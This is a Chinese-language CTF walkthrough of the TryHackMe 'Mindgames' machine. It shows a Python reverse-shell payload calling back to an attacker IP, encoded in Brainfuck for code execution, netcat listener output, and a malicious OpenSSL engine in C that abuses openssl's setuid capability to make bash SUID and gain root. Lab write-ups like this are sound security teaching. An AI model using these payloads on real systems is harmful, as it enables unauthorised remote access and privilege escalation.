# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测
```
┌──(root💀kali)-[~/tryhackme/Mindgames]
└─# nmap -sV -Pn 10.10.170.96     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 03:13 EST
Nmap scan report for 10.10.170.96
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.58 seconds
```

80端口页面显示了一种奇怪的编程语言，有输入框，查了一下这种编程语言叫```Brainfuck```

```
Sometimes those bad ideas get turned into a CTF box.
I'm so sorry.

Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!

Like it? Purchase a license today for the low, low price of 0.009BTC/yr!
Hello, World

+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

Fibonacci

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.

Try before you buy.
```


然后我在谷歌搜索了一下，在[这个网站](https://www.dcode.fr/brainfuck-language)可以把Brainfuck和python互相转换。那就很简单了，我们只需要写一个python的反弹shell就可以拿到初始shell

我们使用以下payload：
```
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.21.169",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

翻译成Brainfuck语言是：
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++++++++.>>-----.++++.<<.>>---.++++.+++++.<-----------.>------.<++.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++.>++++.+++++.>---------------------.<+++.+++++.---------.>-----------.<<--.>>+++++++++++++++++++++++++++++++.----.------------.++++++++.------.+++++++++++++++.<<++.>++++++++++++++.----.------------.++++++++.++++++++++++++++++++.------------.+.--.-------------.----.++++++++++++.<-----.++++++++++++++++++.>>-.<<-------------.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.+++++++++++++++.-.--.+++.++.-----.++++.-.---.+++.+++++.+++.-----------------------.++++++++++.++++++++.--.++.--.---------..++++++++++++++++++.>>-----.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++.-------.++++++++++++++++++.>>.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.+++++.--------.++++++++++++++++++.>>.++++.<<-------------.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++++.---------.++++++++++++++++++.>>+.++++.+++++.<<-------------.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.+++++++++++++.>>------------.+++++++.+++++.<<.>>+++++.-----------.<<-------------.+++++++.
```

在页面执行上面Brainfuck代码，拿到反弹shell
```
┌──(root💀kali)-[~/tryhackme/Mindgames]
└─# nc -lnvp 4242                                                                                                                                                                                                                     130 ⨯
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.170.96] 57554
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
$ whoami
whoami
mindgames

```

在```/home/mindgames```拿到user.txt

没有密码我们看不到sudo特权

# 提权
传linpea，发现openssl有setuid能力：
```
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep

```
我们准备以下代码，保存成priv.c，[参考这里](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)
```
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "test";
static const char *engine_name = "hope it works";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");    
  system("echo Complete!");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
上面代码主要是把bash变成一个SUID文件

编译成priv.so文件

```
┌──(root💀kali)-[~/tryhackme/Mindgames]
└─# gcc -c -fPIC priv.c -o priv                                                                                                                                                                                                         1 ⨯
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Mindgames]
└─# gcc -shared -o priv.so -lcrypto priv
```


传到靶机

执行以下命令：
> /usr/bin/openssl  req -engine /tmp/priv.so

此时已经执行了setuid命令，但是另外需要开一个shell，重新在web上反弹一个新shell，执行```bash -p```，提权到root
```
┌──(root💀kali)-[~/tryhackme/Mindgames]
└─# nc -lnvp 4242                                                                                                                                                                                                 
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.170.96] 57578
$ python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('pty').spawn('/bin/bash')"
bash-4.4$ bash -p
bash -p
bash-4.4# id
id
uid=1001(mindgames) gid=1001(mindgames) euid=0(root) egid=0(root) groups=0(root),1001(mindgames)
bash-4.4# whoami
whoami
root
bash-4.4# cat /root/root.txt
cat /root/root.txt

```